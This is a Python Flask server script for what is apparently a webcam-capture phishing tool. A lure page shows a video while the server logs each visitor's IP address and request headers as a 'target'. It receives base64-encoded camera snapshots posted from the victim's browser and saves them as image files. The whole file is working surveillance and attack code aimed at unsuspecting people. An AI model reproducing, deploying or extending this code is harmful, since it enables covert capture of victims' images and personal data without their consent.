from flask import Flask, render_template, request
from base64 import b64decode
import datetime
import os
from termcolor import colored
import json
import time

app = Flask(__name__)


@app.route('/')
def index():
    with open('vID.txt', 'rt') as vid:
        data = vid.read()
    ip = request.remote_addr
    headers = request.headers
    with open(ip+'.txt', 'w') as target:
        target.writelines(f'IP: {ip}\nDetails:\n{headers}')
    print(f"{colored('Target Visited to the URL', 'green')}\nIP: {colored(ip, 'green')}\nDetails: {colored(headers, 'green')}")
    return render_template('index.html', video_id=data)


@app.route('/data/', methods=['GET', 'POST'])
def data():
    if request.method == 'POST':
        ip = request.remote_addr
        headers = request.headers
        date = datetime.datetime.now()
        tm = date.strftime('%Y%m%d%I%M%S')
        data = request.form['cat']
        imgData = b64decode(data[31:])
        if 'target' in os.listdir():
            os.chdir('target')
            with open('cam'+tm+'.png', 'wb') as img:
                img.write(imgData)
            print(f"{colored('Cam File Recieved...', 'green')}")
        elif '/target' in os.getcwd():
            with open('cam'+tm+'.png', 'wb') as img:
                img.write(imgData)
            print(f"{colored('Cam File Recieved...', 'green')}")
        else:
            os.mkdir('target')
            os.chdir('target')
            with open('cam'+tm+'.png', 'wb') as img:
                img.write(imgData)
            print(f"{colored('Cam File Recieved...', 'green')}")

    return "Data Recieving Endpoint."


app.run(debug=True)
